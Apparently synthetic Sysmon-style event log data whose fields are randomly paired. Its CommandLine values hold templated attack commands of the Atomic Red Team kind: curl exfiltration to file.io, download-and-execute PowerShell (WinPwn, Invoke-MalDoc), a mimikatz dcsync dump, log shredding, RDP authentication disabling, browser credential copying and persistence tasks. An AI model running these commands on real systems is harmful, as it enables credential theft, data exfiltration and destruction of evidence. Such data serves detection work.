        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-40.huff.com",
        "User": "sandovalscott",
        "ProcessID": 1166,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Get-GPO -Domain $ENV:userdnsdomain #{gpo_param} >> #{gpo_output}\",",
        "LogonID": 797177,
        "LogonGuid": "167f19f8-70f9-498e-961b-2888984076b7",
        "SourceProcessID": 1816,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\high..exe",
        "DestinationProcessID": 2987,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\management..exe",
        "UtcTime": "2024-05-17T01:36:51.868101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-45.atkins-rodgers.com",
        "User": "barrymorris",
        "ProcessID": 2652,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"#{curl_path} -k -F \\\"file=@#{input_file}\\\" https://file.io/\\n\",",
        "LogonID": 701076,
        "LogonGuid": "c72ed728-9d5f-42e8-a61d-de95bab79a4c",
        "SourceProcessID": 9782,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\student..dll",
        "DestinationProcessID": 8959,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\bring..exe",
        "UtcTime": "2024-05-17T01:36:51.869102Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-31.brown.com",
        "User": "sextonjames",
        "ProcessID": 5878,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"echo cmd /c echo \\\"Shell code execution.\\\"> #{file_name}:#{ads_filename}\\nfor /f \\\"usebackq delims=?\\\" %i in (#{file_name}:#{ads_filename}) do %i\\n\",",
        "LogonID": 352441,
        "LogonGuid": "b835879e-6d46-4885-9761-6aa7b97d8497",
        "SourceProcessID": 9033,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\well..dll",
        "DestinationProcessID": 1332,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\know..dll",
        "UtcTime": "2024-05-17T01:36:51.869102Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-95.cox.biz",
        "User": "cbradley",
        "ProcessID": 1445,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sudo shred -u -z -n 3 #{system_log_path}\\n\",",
        "LogonID": 201438,
        "LogonGuid": "a98fbb15-ac06-40c3-98c0-e3676bbdcc2b",
        "SourceProcessID": 7522,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\rule..dll",
        "DestinationProcessID": 5647,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\wind..exe",
        "UtcTime": "2024-05-17T01:36:51.869102Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-07.stevens-snow.com",
        "User": "tpierce",
        "ProcessID": 3560,
        "ProcessName": "nc.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGPORemoteAccessPolicy -consoleoutput -noninteractive\",",
        "LogonID": 899596,
        "LogonGuid": "f40c02aa-78bd-46bf-9b74-e8d1852bf8f2",
        "SourceProcessID": 2304,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\TV..dll",
        "DestinationProcessID": 3396,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\piece..dll",
        "UtcTime": "2024-05-17T01:36:51.869102Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-37.austin.com",
        "User": "wrighttiffany",
        "ProcessID": 9536,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sudo -l      \\nsudo cat /usr/local/etc/sudoers\\nsudo ee /usr/local/etc/sudoers\\n\",",
        "LogonID": 640440,
        "LogonGuid": "6d130a83-7963-4ee2-95d6-95471c5c13a7",
        "SourceProcessID": 1302,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\about..exe",
        "DestinationProcessID": 6457,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\agreement..dll",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-74.moore.com",
        "User": "jeremy61",
        "ProcessID": 5422,
        "ProcessName": "malware.exe",
        "CommandLine": "\"start \\\"\\\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\\n\",",
        "LogonID": 697136,
        "LogonGuid": "b10491f2-9369-4efc-971a-5ddd195a1f00",
        "SourceProcessID": 5569,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\ready..dll",
        "DestinationProcessID": 1615,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\part..exe",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-05.white.com",
        "User": "blopez",
        "ProcessID": 6078,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\" /v UserAuthentication /d 0 /t REG_DWORD /f\\n\",",
        "LogonID": 879242,
        "LogonGuid": "57ef6f77-7623-46b1-9139-99035418bcb0",
        "SourceProcessID": 5985,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\war..dll",
        "DestinationProcessID": 3562,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\later..exe",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-17.torres.info",
        "User": "kathryn21",
        "ProcessID": 5940,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$url = \\\"#{url_of_wallpaper}\\\"\\n$imgLocation = \\\"#{wallpaper_location}\\\"\\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\\\Control Panel\\\\Desktop\\\\' -Name WallPaper).WallPaper\\n$orgWallpaper | Out-File -FilePath \\\"#{pointer_to_orginal_wallpaper}\\\"\\n$updateWallpapercode = @' \\nusing System.Runtime.InteropServices; \\nnamespace Win32{\\n\\n    public class Wallpaper{ \\n        [DllImport(\\\"user32.dll\\\", CharSet=CharSet.Auto)] \\n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \\n         \\n         public static void SetWallpaper(string thePath){ \\n            SystemParametersInfo(20,0,thePath,3); \\n        }\\n    }\\n} \\n'@\\n$wc = New-Object System.Net.WebClient  \\ntry{  \\n    $wc.DownloadFile($url, $imgLocation)\\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\ncatch [System.Net.WebException]{  \\n    Write-Host(\\\"Cannot download $url\\\") \\n    add-type $updateWallpapercode \\n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\\n} \\nfinally{    \\n    $wc.Dispose()  \\n}\\n\",",
        "LogonID": 385606,
        "LogonGuid": "6d8f5f69-0326-4028-965d-a5948836b60b",
        "SourceProcessID": 6834,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\true..dll",
        "DestinationProcessID": 6912,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\news..exe",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-63.shannon.info",
        "User": "epatton",
        "ProcessID": 5527,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"schtasks /create /tn \\\"T1053_005_OnLogon\\\" /sc onlogon /tr \\\"cmd.exe /c calc.exe\\\"\\nschtasks /create /tn \\\"T1053_005_OnStartup\\\" /sc onstart /ru system /tr \\\"cmd.exe /c calc.exe\\\"\\n\",",
        "LogonID": 519033,
        "LogonGuid": "01c07151-4d6b-4069-a86e-6bf60d3a966e",
        "SourceProcessID": 7976,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\bit..dll",
        "DestinationProcessID": 7685,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\your..exe",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-86.farrell.com",
        "User": "rodriguezdylan",
        "ProcessID": 8239,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"reg ADD \\\"HKCR\\\\CLSID\\\\{645FF040-5081-101B-9F08-00AA002F954E}\\\\shell\\\\open\\\\command\\\" /ve /d \\\"calc.exe\\\" /f\",",
        "LogonID": 388983,
        "LogonGuid": "610029ff-01bb-4bc2-a73b-bdc9e66a2121",
        "SourceProcessID": 8377,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\prepare..exe",
        "DestinationProcessID": 6784,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\hot..dll",
        "UtcTime": "2024-05-17T01:36:51.870102Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-18.johnson.com",
        "User": "ehill",
        "ProcessID": 8781,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=person) #{optional_args}\\n\",",
        "LogonID": 180375,
        "LogonGuid": "a74b0afd-77fc-455c-8a18-8ef7a8980b2f",
        "SourceProcessID": 2379,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\movie..exe",
        "DestinationProcessID": 5042,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\bar..exe",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-29.rogers.com",
        "User": "brandon30",
        "ProcessID": 2301,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"cp ~/Library/\\\"Application Support/Google/Chrome/Default/Login Data\\\" \\\"/tmp/T1555.003_Login Data\\\"\\ncp ~/Library/\\\"Application Support/Google/Chrome/Default/Login Data For Account\\\" \\\"/tmp/T1555.003_Login Data For Account\\\"\\n\",",
        "LogonID": 780842,
        "LogonGuid": "f717cb26-e446-4536-8fea-14e1e5b59dd1",
        "SourceProcessID": 9103,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\possible..exe",
        "DestinationProcessID": 5552,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\push..exe",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-34.adams.com",
        "User": "emily17",
        "ProcessID": 9790,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\CredSSP\\\\Parameters\\\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\\n\",",
        "LogonID": 508954,
        "LogonGuid": "82f6bb7e-07ab-4243-aee0-8e6f83dca520",
        "SourceProcessID": 2197,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\behavior..exe",
        "DestinationProcessID": 6754,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\character..exe",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-77.williams.org",
        "User": "grant53",
        "ProcessID": 8074,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"#{mimikatz_path} \\\"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\\\" \\\"exit\\\"\\n\",",
        "LogonID": 107414,
        "LogonGuid": "279c3da5-ae2e-4519-94db-75bb1df0bc87",
        "SourceProcessID": 5318,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\if..exe",
        "DestinationProcessID": 2139,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\for..dll",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-78.reynolds-richardson.com",
        "User": "sarah51",
        "ProcessID": 7161,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"ENCODED=$(echo '#{message}' | b64encode -r -)\\nprintf $ENCODED | b64decode -r\\necho $ENCODED | b64decode -r\\necho $(echo $ENCODED) | b64decode -r\\necho $ENCODED > #{encoded_file} && b64encode -r #{encoded_file}\\necho $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file}\\necho $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r\\necho $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r\\n\",",
        "LogonID": 421963,
        "LogonGuid": "8a35c2de-a2fd-4319-af09-926d159f28fa",
        "SourceProcessID": 5789,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\air..exe",
        "DestinationProcessID": 6565,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\produce..exe",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-19.klein.com",
        "User": "bmendez",
        "ProcessID": 8394,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Get-ADComputer #{hostname} -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\",",
        "LogonID": 177696,
        "LogonGuid": "c245bbb0-35eb-4efc-9ae5-2ef329169ba7",
        "SourceProcessID": 6739,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\movie..exe",
        "DestinationProcessID": 2104,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\system..dll",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-58.carroll-hughes.info",
        "User": "matthew53",
        "ProcessID": 4233,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin\\n\",",
        "LogonID": 959315,
        "LogonGuid": "253b1735-be6d-4dc1-b0d2-974196b8329d",
        "SourceProcessID": 3144,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\action..dll",
        "DestinationProcessID": 2119,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\media..exe",
        "UtcTime": "2024-05-17T01:36:51.871101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-53.moreno.net",
        "User": "ihenry",
        "ProcessID": 2782,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'\",",
        "LogonID": 367533,
        "LogonGuid": "85c73266-f1d4-4d37-a6b9-62e9889bbcc6",
        "SourceProcessID": 8081,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\than..exe",
        "DestinationProcessID": 2203,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\issue..dll",
        "UtcTime": "2024-05-17T01:36:51.872102Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-73.mendoza.com",
        "User": "lewislinda",
        "ProcessID": 6839,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"curl -F 'file=@#{input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\\n\",",
        "LogonID": 750623,
        "LogonGuid": "55de9438-cbf0-409b-93bd-267232d5f0d6",
        "SourceProcessID": 5278,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\consider..exe",
        "DestinationProcessID": 3692,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\laugh..dll",
        "UtcTime": "2024-05-17T01:36:51.872102Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-76.castro-chang.net",
        "User": "ashleynelson",
        "ProcessID": 1754,
        "ProcessName": "malware.exe",
        "CommandLine": "\"schtasks /create /tn \\\"T1053_005_OnLogon\\\" /sc onlogon /tr \\\"cmd.exe /c calc.exe\\\"\\nschtasks /create /tn \\\"T1053_005_OnStartup\\\" /sc onstart /ru system /tr \\\"cmd.exe /c calc.exe\\\"\\n\",",
        "LogonID": 932539,
        "LogonGuid": "8162d6e3-3f5f-4af8-b7b8-00846b7305fd",
        "SourceProcessID": 8571,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\sometimes..dll",
        "DestinationProcessID": 9377,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\turn..exe",
        "UtcTime": "2024-05-17T01:36:51.872102Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-35.vincent-small.info",
        "User": "sarah94",
        "ProcessID": 6560,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1555\\\\src\\\\T1555-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"Extract\\\"\\n\",",
        "LogonID": 500535,
        "LogonGuid": "e36d922e-e0aa-4b63-85f7-d6a04c7606ec",
        "SourceProcessID": 5461,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\court..exe",
        "DestinationProcessID": 3401,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\left..exe",
        "UtcTime": "2024-05-17T01:36:51.872102Z"
    },
